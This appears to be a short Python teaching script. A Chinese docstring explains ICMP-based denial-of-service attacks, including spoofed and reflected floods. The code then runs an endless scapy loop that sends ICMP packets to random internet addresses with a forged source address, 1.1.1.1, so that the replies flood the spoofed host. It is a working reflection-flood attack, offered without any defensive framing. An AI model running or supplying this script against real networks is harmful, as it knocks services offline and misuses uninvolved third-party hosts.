"""
   网络层的拒绝服务攻击：
      位于网络层的协议包括ARP,IP,ICMP等，其中ICMP用在IP主机，路由器之间进行传递控制信息。
      因为目标主机在处理请求和应答是需要消耗CPU资源的，所以我们只要疯狂发送大数据包给目标主机就能发动攻击
      因为现在的cpu性能足以应对足够规模的请求消耗，所以可以用多台计算机同时发送ICMP数据包，或者提高发送的速度（
      除了使用本机地址之外，还可以：
         1.使用随机地址
         2.向不同的地址发送 以攻击目标的IP地址为发送地址的数据包
      （这种方式淹没目标的洪水不是由攻击者发出的，也不是伪造IP发出的，而是由正常通信的服务器发出的。
"""
import sys,random
from scapy.all import send,IP,ICMP
while 1:
   pdst= "%i.%i.%i.%i" % (random.randint(1,254),random.randint(1,254),random.randint(1,254),random.randint(1,254))
   psrc="1.1.1.1"
   send(IP(src=psrc,dst=pdst)/ICMP())